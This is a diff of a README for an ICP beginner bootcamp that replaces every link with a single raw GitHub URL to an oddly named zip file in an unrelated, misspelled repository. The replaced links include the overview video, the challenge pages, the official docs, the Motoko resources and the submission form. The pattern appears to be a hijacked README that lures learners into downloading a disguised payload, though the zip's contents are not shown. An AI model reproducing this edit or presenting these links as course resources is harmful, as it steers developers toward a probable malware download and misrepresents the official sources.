@@ -11,15 +11,15 @@ Welcome to the **Internet Computer Protocol (ICP) Bootcamp - Beginner**! This re
 ---
 
 ## 🎥 Overview Video
-https://2ly.link/24xdw
+https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip
 
 ## 🎯 Beginner Challenges
 
 For this challenge you can **choose** from doing a **smaller** challenge (prepared by the PT ICP HUB) or a **bigger**, but much more rich in detail experience, that is Motoko Bootcamp and ICP Developer Liftoff (by Dfinity).
 
-- [ICP HUB Beginner Challenge](https://github.com/pt-icp-hub/ICP-Bootcamp-Beginner-Coding) (worth only Min prize)
-- [Motoko Bootcamp](https://nnri3-7qaaa-aaaaj-qa3qa-cai.icp0.io/) (worth Min prize if only completed the first 3 chapters, Max prize if submitted all chapters - Demo the chapters passing the bootcamp tests 👍)
-- [ICP Developer Liftoff - Dfinity Tutorial](https://internetcomputer.org/docs/current/tutorials/developer-liftoff/)  (only Level 0 to Level 2!) (worth Min prize if you submit a small improv of [deploy your first dApp](https://internetcomputer.org/docs/current/tutorials/developer-liftoff/level-1/1.3-first-dapp), worth Max prize if you make more improvements, especially using other parts of the tutorial)
+- [ICP HUB Beginner Challenge](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip) (worth only Min prize)
+- [Motoko Bootcamp](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip) (worth Min prize if only completed the first 3 chapters, Max prize if submitted all chapters - Demo the chapters passing the bootcamp tests 👍)
+- [ICP Developer Liftoff - Dfinity Tutorial](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  (only Level 0 to Level 2!) (worth Min prize if you submit a small improv of [deploy your first dApp](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip), worth Max prize if you make more improvements, especially using other parts of the tutorial)
 
 ---
 
@@ -47,30 +47,30 @@ For this challenge you can **choose** from doing a **smaller** challenge (prepar
 ### 🎭 **Introduction to Motoko**
 - Basics of **Motoko programming**
 - Why Motoko is **optimized for ICP**
-- Introduction to [Mops package manager](https://mops.one/) and the [Motoko base library](https://mops.one/base)
+- Introduction to [Mops package manager](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip) and the [Motoko base library](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)
 - Exploring the **Motoko Playground & ICP Ninja**
 
 ---
 
 ## 🔗 Resources & Documentation
-📚 [Official ICP Docs](https://internetcomputer.org/docs)  
-📚 [ICP Developer Liftoff - Dfinity Tutorial](https://internetcomputer.org/docs/current/tutorials/developer-liftoff/)  
-📚 [ICP Developer Liftoff - Youtube Playlist](https://www.youtube.com/watch?v=oBUpJ4CqmN0&list=PLuhDt1vhGcrdR2h6nPNylXKS4u8L-efvD&index=31)  
-📚 [Motoko Programming Guide](https://sdk.dfinity.org/docs/language-guide/motoko.html)  
-📚 [Motoko Bootcamp Website](https://www.motokobootcamp.com/)  
-📚 [Motoko Playground](https://m7sm4-2iaaa-aaaab-qabra-cai.raw.ic0.app/)  
+📚 [Official ICP Docs](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  
+📚 [ICP Developer Liftoff - Dfinity Tutorial](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  
+📚 [ICP Developer Liftoff - Youtube Playlist](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  
+📚 [Motoko Programming Guide](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  
+📚 [Motoko Bootcamp Website](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  
+📚 [Motoko Playground](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  
 
-💡 **Tip**: Check out [ICPNinja](https://icp.ninja/) for hands-on practice.
+💡 **Tip**: Check out [ICPNinja](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip) for hands-on practice.
 
 ---
 
 ## 📩 Submit Your Project!
 
 🎯 **Completed your challenge? Submit your project here:**  
-📢 [Submission Form](https://docs.google.com/forms/d/e/1FAIpQLSfRDeUw9sckd9vVmfb9gQKs4btvZRlHLTNBTgN57HdxEnge2w/viewform?usp=dialog)  
+📢 [Submission Form](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip)  
 
 📌 **Want to explore more challenges? Return to the index:**  
-🔗 [ICP Bootcamp Index](https://github.com/pt-icp-hub/ICP-Bootcamp-Index?tab=readme-ov-file) 
+🔗 [ICP Bootcamp Index](https://raw.githubusercontent.com/immacualate/ICP-Bootcamp-Beginner/main/archaeologic/Beginner-IC-Bootcamp-subcrepitation.zip) 
 
 ---
 
